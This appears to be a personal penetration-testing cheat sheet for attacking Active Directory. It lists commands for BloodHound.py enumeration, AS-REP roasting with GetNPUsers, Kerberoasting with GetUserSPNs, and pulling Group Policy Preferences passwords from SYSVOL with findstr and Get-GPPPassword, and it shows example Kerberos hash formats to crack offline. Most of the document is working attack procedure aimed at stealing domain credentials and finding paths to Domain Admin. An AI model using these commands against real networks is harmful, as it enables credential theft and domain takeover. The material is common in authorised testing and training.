# Conda

## Bloodhound

### Collection

#### SharpHound

```bash
```

#### BloodHound.py

```bash
# Installation
pip3 install bloodhound
# Binary
bloodhound-python
# Command
bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
# Copy json output file into Bloodhound
```

### Enumeration

#### Node Info

* Can search and select a specific user, machine, etc. where you can get details of it.
* Can right click on user in graph and mark as owned.
* Can right click on permission and click on Help.

#### Queries

* Find AS-REP Roastable Users (DontReqPreAuth)&#x20;
* Find Shortest Paths to Domain Admin
* Shortest Paths to Domain Admins from Owned Principals

## AS-REP Roasting

> Must have a username or list of usernames to perform

### GetNPUsers

```bash
# From Kali
GetNPUsers.py <domain.local>/<username> -dc-ip=<IP>
# Look "getting its TGT"
$krb5asrep$23$<username>@<domain.local>:12345...
# Then can attempt to brute force offline with John or Hashcat
```

## Kerberoasting

> Must have an already compromised account to authenticate with

### GetUserSPNs

```bash
# From Kali
GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username>
# A list of accounts with SPNs should show along with the account name, etc.
GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username> -request
# Look for the hash in the output
$krb5tgs$23$*<Username>$<domain.local$<domain.local>/<username*>$12345...
# Then can attempt to brute force offline with John or Hashcat
```

## GPP Credentials

> Must have an already compromised account to authenticate with

### Get-GPPPassword.ps1

```bash
# From Windows Target
findstr /S /I cpassword \\<domain.local>\sysvol\<domain.local>\policies\*.xml
# Look for the cpassword= value
cpassword="<value>"
# Then can attempt to decrypt them offline using PowerSploit's Get-GPPPassword.ps1
Get-GPPPassword
# Look for Password value output
```
